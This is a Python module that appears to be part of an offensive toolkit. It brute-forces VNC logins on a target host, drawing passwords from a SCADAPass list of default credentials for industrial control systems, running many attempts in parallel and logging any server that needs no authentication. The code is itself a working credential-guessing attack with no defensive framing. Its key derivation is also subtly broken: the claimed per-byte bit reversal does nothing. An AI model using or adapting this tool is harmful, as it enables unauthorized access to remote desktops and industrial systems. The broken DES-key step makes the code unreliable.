import socket
import struct
from concurrent.futures import ThreadPoolExecutor, as_completed
from utils.logger import setup_logger
from utils.scadapass_updater import load_scadapass_credentials

logger = setup_logger()

def try_vnc_login(target, port, password, timeout=5):
    try:
        s = socket.create_connection((target, port), timeout=timeout)

        # VNC Protocol Handshake
        proto_version = s.recv(12)
        if not proto_version.startswith(b"RFB"):
            logger.warning(f"[{target}:{port}] Invalid VNC banner: {proto_version}")
            return None

        s.sendall(proto_version)  # send back the same version
        sec_types = s.recv(1)
        if sec_types == b'\x01':  # None
            logger.info(f"[{target}:{port}] No authentication required!")
            return ('', '')  # No auth
        elif sec_types == b'\x02':
            s.sendall(b'\x02')  # Choose VNC auth
            challenge = s.recv(16)

            from Crypto.Cipher import DES
            from Crypto.Util.Padding import pad

            key = password.ljust(8, '\x00')[:8]
            key = bytes([ord(c[::-1]) for c in key])  # VNC reverses bits in each byte

            des = DES.new(key, DES.MODE_ECB)
            response = des.encrypt(challenge)
            s.sendall(response)
            status = s.recv(4)
            if struct.unpack("!I", status)[0] == 0:
                logger.info(f"Valid VNC password found: {password}")
                return ('', password)
        s.close()
    except Exception as e:
        logger.debug(f"[{target}:{port}] VNC brute error with {password}: {e}")
    return None


def vnc_brute_force_with_scadapass(target, scadapass_file=None, system_name=None, port=5900, max_workers=20):
    passwords = []
    creds = load_scadapass_credentials(scadapass_file) if scadapass_file else {}

    if system_name and system_name in creds:
        passwords = list({p for _, p in creds[system_name]})
    else:
        for v in creds.values():
            passwords.extend([p for _, p in v])
    passwords = list(set(passwords)) or ['admin', 'password', '123456']

    logger.info(f"[*] Starting VNC brute force on {target}:{port} with {len(passwords)} passwords")

    valid = None
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = [executor.submit(try_vnc_login, target, port, password) for password in passwords]
        for future in as_completed(futures):
            result = future.result()
            if result:
                valid = result
                break

    if not valid:
        logger.info("[!] No valid VNC credentials found")
    return valid
